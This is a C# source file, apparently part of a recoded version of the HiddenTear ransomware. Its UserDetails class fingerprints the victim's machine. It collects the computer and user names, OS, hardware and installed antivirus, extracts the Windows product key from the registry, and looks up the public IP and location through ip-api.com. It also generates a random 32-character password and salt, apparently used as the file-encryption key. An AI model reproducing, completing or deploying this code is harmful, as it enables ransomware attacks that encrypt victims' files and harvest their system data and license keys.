using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace hiddentearrecoded
{
    class UserDetails
    {
        //when using just = and not => C# serializer does not work.... 
        //You can replace it with a much better alternative called Newtonsoft Json

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetPhysicallyInstalledSystemMemory(out long TotalMemoryInKilobytes);
        public static byte[] RandomSaltBytes()
        {
            byte[] salt = new byte[8];
            RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();
            rng.GetBytes(salt);
            return salt;
        }
        public string ID => UUID.Get();
        public string ComputerName => Environment.MachineName.ToString();
        public string UserName => Environment.UserName;
        public string OS => (string)Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "");
        public string SystemType => Environment.Is64BitOperatingSystem ? "64" : "86";
        public int RAMGB { get; set; }
        public string[] GPUs => Utils.GPUs();
        public string CPU => Utils.CPU();
        public string[] Monitors => Utils.Monitors();
        public string AntiVirus => Utils.GetAV();
        public string IPDetailsJson { get; set; }

        public string SenderIP { get; set; }
        public string Password { get; set; }
        public byte[] SaltBytes { get; set; }
        public string WindowsKey => KeyDecoder.GetWindowsProductKeyFromRegistry();
        public UserDetails()
        {
            long kb;
            GetPhysicallyInstalledSystemMemory(out kb);
            RAMGB = (int)(kb / 1024 / 1024);
            Password = Utils.CreatePassword(32);
            //Get salt bytes
            SaltBytes = UserDetails.RandomSaltBytes();

            try
            {
                IPDetailsJson = new WebClient().DownloadString("http://ip-api.com/json/");
            }
            catch
            {
                IPDetailsJson = "";
            }

            
        }

        public static UserDetails details = new UserDetails();
    }
}
